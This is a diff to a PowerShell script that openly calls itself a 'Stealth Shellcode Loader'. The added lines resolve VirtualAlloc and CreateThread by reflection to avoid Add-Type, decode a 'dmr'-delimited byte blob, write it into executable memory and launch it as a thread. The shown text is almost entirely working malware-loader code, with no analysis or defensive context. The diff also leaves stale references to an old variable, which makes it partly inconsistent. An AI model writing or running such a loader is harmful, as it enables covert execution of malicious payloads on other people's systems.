@@ -15,10 +15,37 @@ if (-not $match) { Write-Error "Blob not found!"; exit }
 # Split by your 'dmr' delimiter and convert to actual bytes
 $byteArray = $match.Split("dmr") | Where-Object { $_ -ne "" } | ForEach-Object { [byte]$_ }
 
-# 4. The Stealth Shellcode Loader (Reflection)
-# This part finds the memory addresses of Windows APIs without using Add-Type
-$Domain = [AppDomain]::CurrentDomain.GetAssemblies()
-$Kernel32 = $Domain | Where-Object { $_.FullName -contains "mscorlib" } | ForEach-Object { $_.GetType("Microsoft.Win32.Win32Native") }
+# 4. The Stealth Shellcode Loader (Improved Reflection)
+# We find the 'unmanaged' GetProcAddress directly from the System.Runtime namespace
+$UnsafeNativeMethods = [AppDomain]::CurrentDomain.GetAssemblies() | 
+    Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'System.dll' } | 
+    ForEach-Object { $_.GetType('Microsoft.Win32.UnsafeNativeMethods') }
+
+$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Reflection.BindingFlags]'Static, Public')
+$GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle', [Reflection.BindingFlags]'Static, Public')
+
+# Get the address of our needed functions
+$hKernel32 = $GetModuleHandle.Invoke($null, @("kernel32.dll"))
+$vAllocAddr = $GetProcAddress.Invoke($null, @($hKernel32, "VirtualAlloc"))
+$cThreadAddr = $GetProcAddress.Invoke($null, @($hKernel32, "CreateThread"))
+
+# Check if we actually found them before proceeding
+if ($vAllocAddr -eq [IntPtr]::Zero) { Write-Error "Failed to find VirtualAlloc!"; exit }
+
+# Create Delegate Types using the specific signatures Windows expects
+$DelegateVirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vAllocAddr, [Func[IntPtr, UInt32, UInt32, UInt32, IntPtr]])
+$DelegateCreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($cThreadAddr, [Func[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])
+
+# 5. Execute
+$size = [uint32]$byteArray.Length
+$address = $DelegateVirtualAlloc.Invoke([IntPtr]::Zero, $size, 0x3000, 0x40)
+
+if ($address -ne [IntPtr]::Zero) {
+    [System.Runtime.InteropServices.Marshal]::Copy($byteArray, 0, $address, $size)
+    $DelegateCreateThread.Invoke([IntPtr]::Zero, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
+    Write-Host "Shellcode injected. Waiting for execution..."
+    Start-Sleep -Seconds 5
+}
 
 # Get Method Handles
 $GetModuleHandle = $Kernel32.GetMethod("GetModuleHandle", [Reflection.BindingFlags]"Static, Public, NonPublic")
